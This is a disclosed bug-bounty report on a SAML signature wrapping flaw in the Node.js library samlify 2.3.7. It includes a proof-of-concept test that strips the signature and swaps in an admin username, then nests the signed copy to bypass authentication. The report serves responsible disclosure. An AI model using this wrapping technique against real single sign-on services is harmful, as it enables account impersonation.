# Samlify is vulnerable to signature wrapping

## Report Details
- **Report ID**: 356284
- **URL**: https://hackerone.com/reports/356284
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-05-23T07:11:09.848Z
- **Disclosed**: 2018-10-23T07:54:50.161Z

## Reporter
- **Username**: webtonull
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report a signature wrapping weakness in samlify
It allows an attacker to modify a SAML token received from the IdP before validating it with the service provider

# Module

**module name:** samlify
**version:** 2.3.7
**npm page:** `https://www.npmjs.com/package/samlify`

## Module Description

Highly configuarable Node.js SAML 2.0 library for Single Sign On

## Module Stats

> Replace stats below with numbers from npm’s module page:

1084 downloads in the last week

# Vulnerability

## Vulnerability Description

It's possible to wrap the signature of a SAML response, and insert a new username in the original token, thus make it appear as though a different user was authenticated.

## Steps To Reproduce:

Clone the github repo, put this in `test/flow.ts` and run `npm run test`:
```

test('should reject signature wrapped response', async t => {
  // sender (caution: only use metadata and public key when declare pair-up in oppoent entity)
  const user = { email: 'user@esaml2.com' };
  const { id, context: SAMLResponse } = await idpNoEncrypt.createLoginResponse(sp, sampleRequestInfo, 'post', user, createTemplateCallback(idpNoEncrypt, sp, user));
  // receiver (caution: only use metadata and public key when declare pair-up in oppoent entity)

  //Decode
  var buffer = new Buffer(SAMLResponse, "base64");
  var xml = buffer.toString();
  //Create version of response without signature
  var stripped = xml
    .replace(/<ds:Signature[\s\S]*ds:Signature>/, "");
  //Create version of response with altered IDs and new username
  var outer = xml
    .replace(/assertion" ID="_[0-9a-f]{3}/g, 'assertion" ID="_000')
    .replace("user@esaml2.com", "admin@esaml2.com");
  //Put stripped version under SubjectConfirmationData of modified version
  var xmlWrapped = outer.replace(/<saml:SubjectConfirmationData[^>]*\/>/, "<saml:SubjectConfirmationData>" + stripped.replace('<?xml version="1.0" encoding="UTF-8"?>', "") + "</saml:SubjectConfirmationData>");
  const wrappedResponse = new Buffer(xmlWrapped).toString("base64");

  const { samlContent, extract } = await sp.parseLoginResponse(idpNoEncrypt, 'post', { body: { SAMLResponse: wrappedResponse } });
  //should probalby be like this -> const error = await t.throws(sp.parseLoginResponse(idpNoEncrypt, 'post', { body: { SAMLResponse: wrappedResponse } }));
  //This tampering goes undetected....and only fails because there are now two names
  t.is(extract.nameid, 'user@esaml2.com');
});
```

## Supporting Material/References:

> State all technical information about the stack where the vulnerability was found

- Ubuntu 16.04
- v7.4.0
- 6.0.0

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N 

I will try to contact the maintainer. I did not want to open an issue as that would make it obvious what the problem was.

## Impact

Authentication bypass

## Attachments
No attachments
